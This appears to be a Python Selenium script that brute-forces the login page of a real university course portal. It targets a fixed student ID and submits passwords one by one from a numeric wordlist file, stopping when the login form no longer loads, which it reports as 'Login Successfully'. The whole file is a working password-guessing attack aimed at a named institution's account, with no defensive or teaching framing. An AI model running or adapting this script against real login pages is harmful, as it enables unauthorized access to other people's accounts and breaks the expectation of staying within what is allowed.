from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import Select
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC


import time

driver = webdriver.Chrome()

# Navigate to a webpage
driver.get("https://courses.uit.edu.vn/login/index.php")


def Login(password):
    try:

        username_field = WebDriverWait(driver, 1).until(
            EC.presence_of_element_located((By.ID, "username"))
        )
        password_field = WebDriverWait(driver, 1).until(
                EC.presence_of_element_located((By.ID, "password"))
            )
    
        username_field.send_keys("21522620")
        password_field.send_keys(password)
        password_field = WebDriverWait(driver, 1).until(
                EC.presence_of_element_located((By.NAME, "password"))
            )
        password_field.send_keys(Keys.RETURN)
    except Exception as e:
        print("Login Successfully")
        return False  
    return True  



# Set up the WebDriver'

with open("numeric_combinations.txt", "r") as file:
    pass_text = file.readlines()

for password in pass_text:
   if not Login(password):
        break 

    
    # driver.implicitly_wait(2)
 # Click the login button




time.sleep(10)
driver.close()


# Close the browser
driver.quit()